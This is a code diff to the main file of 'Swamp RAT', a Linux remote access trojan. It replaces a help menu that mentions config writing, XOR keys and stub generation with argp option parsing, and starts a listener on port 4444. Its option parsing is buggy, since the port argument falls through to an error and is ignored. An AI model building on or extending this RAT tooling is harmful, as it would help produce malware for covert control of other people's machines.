@@ -18,49 +18,47 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h>
+#include <argp.h>
 #include "include/main/net.h"
-#include "include/main/config.h"
 
-void help_menu(){
-  printf("Swamp RAT by lillypad\n"
-         "  [-h][--help  ]   help menu\n"
-         "  [-c][--config]   write config file\n"
-         "    [-x][--xor ]   xor key (int)"
-         "    [-H][--host]   server host\n"
-         "    [-p][--port]   server port\n"
-         "  [-s][--stub]     write stub file\n"
-         "    [-i][--input]  input config file"
-         "  [-l][--listen]   listener\n"
-         "    [-p][--port]   listener port\n"
-         "swamp-rat -x 10 -H 127.0.0.1 -p 80 -c config.bin\n"
-         "swamp-rat -s stub -i config.bin\n");
+const char *program_version = "swamp-rat 0.9b";
+
+const char *program_bug_address = "lillypadgirl86@gmail.com";
+
+static char program_doc[] = "swamp-rat --- A Linux Rat in C";
+
+static char program_args_doc[] = "asdf asdf";
+
+static struct argp_option program_options[] = {
+  {"help", 'h', 0, 0, "help menu"},
+  {"port", 'p', "ARG", 0,  "listen port"},
+  { 0 }
+};
+
+struct arguments{
+  char *args[2];
+  int port;
+};
+
+static error_t parse_opt(int key,
+                         char *arg,
+                         struct argp_state *state){
+  struct arguments *arguments = state->input;
+  switch(key){
+  case 'p':
+    arguments->port = atoi(arg);
+  default:
+    return ARGP_ERR_UNKNOWN;
+  }
+  return 0;
 }
 
+static struct argp argp = {program_options, parse_opt, program_args_doc, program_doc};
+
 int main(int argc, char **argv){
-  /* char *host = "127.0.0.1"; */
-  /* int host_port = 80; */
-  /* char *config_path = "config.bin"; */
-  /* int xor_key = 10; */
-  /* if (argc == 2){ */
-  /*   if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0){ */
-  /*     help_menu(); */
-  /*     return EXIT_SUCCESS; */
-  /*   } */
-  /* } */
-  /* for (int i = 1; i < argc; i++){ */
-  /*   if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--config")){ */
-  /*     config_path = argv[i+1]; */
-  /*     config_write(config_path, host, host_port, xor_key); */
-  /*     return EXIT_SUCCESS; */
-  /*   } */
-  /* } */
-  /* for (int i = 1; i < argc; i++){ */
-  /*   if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--stub") == 0){ */
-  /*     return EXIT_SUCCESS; */
-  /*   } */
-  /* } */
-  /* fprintf(stderr, "error: not enough arguments\n"); */
-  //help_menu();
+  struct arguments arguments;
+  arguments.port = 4444;
+  argp_parse(&argp, argc, argv, 0, 0, &arguments);
   net_start_server(4444);
   return EXIT_FAILURE;
 }
